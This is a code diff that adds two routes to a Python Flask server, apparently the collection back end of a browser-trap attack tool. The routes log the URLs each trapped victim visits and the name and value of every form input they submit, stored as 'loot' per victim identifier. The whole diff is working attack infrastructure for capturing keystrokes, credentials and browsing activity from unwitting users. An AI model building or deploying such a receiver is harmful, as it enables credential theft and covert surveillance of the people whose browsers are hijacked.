@@ -156,6 +156,39 @@ def recordScreenshot(identifier):
 
 
 
+# Record new URL visited in trap
+@app.route('/loot/location/<identifier>', methods=['POST'])
+def recordUrl(identifier):
+    print("New URL recorded from: " + identifier)
+    lootDir = findLootDirectory(identifier)
+    content = request.json
+    print("*** Content is: " + str(content))
+    url = content['url']
+    print("Got URL: " + url)
+    logEvent(identifier, "URL Visited: " + url)
+
+    return "ok", 200
+
+
+
+
+# Record user inputs
+@app.route('/loot/input/<identifier>', methods=['POST'])
+def recordInput(identifier):
+    print("New input recorded from: " + identifier)
+    lootDir = findLootDirectory(identifier)
+    content = request.json
+    inputName = content['inputName']
+    inputValue = content['inputValue']
+    print("Got input: " + inputName + ", value: " + inputValue)
+    logEvent(identifier, "Input: " + inputName + ", value: " + inputValue)
+
+    return "ok", 200
+
+#**************************************************************************
+
+
+
 if __name__ == '__main__':
     printHeader()
 
